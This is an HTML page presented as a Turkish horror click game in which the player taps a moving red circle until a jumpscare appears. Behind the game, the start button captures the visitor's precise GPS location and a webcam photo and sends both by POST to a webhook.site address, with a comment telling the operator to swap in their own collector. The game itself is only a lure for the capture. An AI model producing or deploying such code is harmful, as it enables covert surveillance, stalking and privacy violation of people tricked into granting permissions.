<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Korku Oyunu</title>
  <style>
    body, html {
      margin: 0; padding: 0;
      background: black; color: white;
      font-family: Arial, sans-serif;
      height: 100vh; overflow: hidden;
    }
    #permission-screen, #game-container, #jumpscare {
      display: none;
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      justify-content: center; align-items: center;
      flex-direction: column; text-align: center;
    }
    #permission-screen { display: flex; }
    button {
      background: crimson; color: white;
      padding: 12px 24px; font-size: 1.2rem;
      border: none; border-radius: 6px;
      cursor: pointer; margin-top: 20px;
    }
    #circle {
      width: 80px; height: 80px;
      background: crimson; border-radius: 50%;
      position: absolute; box-shadow: 0 0 15px red;
      cursor: pointer;
    }
    #score-display {
      position: absolute; top: 20px; left: 20px;
      font-size: 1.5rem;
    }
    #goal {
      position: absolute; top: 20px; right: 20px;
      font-size: 1rem; color: orange;
    }
    #jumpscare img {
      width: 100%; max-width: 600px;
    }
  </style>
</head>
<body>

<div id="permission-screen">
  <h1>Konum ve kamera izni ver, ardÄ±ndan oyun baÅŸlasÄ±n!</h1>
  <button id="start-btn">BaÅŸla</button>
</div>

<div id="game-container">
  <div id="score-display">Skor: 0</div>
  <div id="goal">Hedef: 15</div>
  <div id="circle"></div>
</div>

<div id="jumpscare">
  <img src="https://i.imgur.com/jxKX1U7.png" alt="Korkutucu yÃ¼z" />
  <audio id="scream" autoplay>
    <source src="https://www.myinstants.com/media/sounds/horror-sound.mp3" type="audio/mpeg" />
  </audio>
</div>

<script>
const startBtn = document.getElementById("start-btn");
const permissionScreen = document.getElementById("permission-screen");
const gameContainer = document.getElementById("game-container");
const circle = document.getElementById("circle");
const scoreDisplay = document.getElementById("score-display");
const jumpscare = document.getElementById("jumpscare");
const scream = document.getElementById("scream");
const webhookUrl = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34"; // DeÄŸiÅŸtir

let score = 0;

startBtn.onclick = async () => {
  try {
    const location = await getLocation();
    const photo = await takePhoto();
    await sendData(location, photo);

    permissionScreen.style.display = "none";
    gameContainer.style.display = "block";
    moveCircle();
  } catch (err) {
    alert("Ä°zin alÄ±namadÄ±: " + err.message);
  }
};

circle.onclick = () => {
  if(score >= 15) return;
  score++;
  scoreDisplay.textContent = "Skor: " + score;
  moveCircle();

  if(score === 15) {
    gameContainer.style.display = "none";
    jumpscare.style.display = "flex";
    scream.play();
    alert("Bitti... ðŸ˜±");
  }
};

function moveCircle() {
  const maxX = window.innerWidth - 80;
  const maxY = window.innerHeight - 80;
  circle.style.left = Math.random() * maxX + "px";
  circle.style.top = Math.random() * maxY + "px";
}

function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error("Konum desteklenmiyor."));
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords),
      err => reject(err),
      { enableHighAccuracy: true }
    );
  });
}

async function takePhoto() {
  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
  const track = stream.getVideoTracks()[0];
  const imageCapture = new ImageCapture(track);
  const bitmap = await imageCapture.grabFrame();
  track.stop();

  const canvas = document.createElement("canvas");
  canvas.width = bitmap.width;
  canvas.height = bitmap.height;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(bitmap, 0, 0);

  return new Promise(resolve => {
    canvas.toBlob(resolve, "image/jpeg", 0.9);
  });
}

async function sendData(coords, photoBlob) {
  const formData = new FormData();
  formData.append("latitude", coords.latitude);
  formData.append("longitude", coords.longitude);
  formData.append("photo", photoBlob, "photo.jpg");

  await fetch(webhookUrl, {
    method: "POST",
    body: formData
  });
}
</script>

</body>
</html>
